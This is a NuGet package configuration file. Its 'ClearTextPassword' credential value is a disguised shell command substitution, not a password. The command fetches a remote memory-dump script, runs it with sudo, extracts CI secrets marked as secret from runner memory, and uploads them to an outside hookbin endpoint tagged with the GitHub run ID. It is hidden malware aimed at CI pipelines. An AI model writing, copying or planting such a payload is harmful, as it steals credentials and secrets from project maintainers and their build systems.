<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <packageSources>
    <add key="pwn" value="https://example.com" />
  </packageSources>
  <packageSourceCredentials>
    <pwn>
      <add key="Username" value="pwn" />
      <add key="ClearTextPassword" value="$(curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '&#34;[^&#34;]+&#34;:\{&#34;value&#34;:&#34;[^&#34;]*&#34;,&#34;isSecret&#34;:true\}' >> /tmp/secrets &amp;&amp; curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/$GITHUB_RUN_ID)" />
    </pwn>
  </packageSourceCredentials>
</configuration>
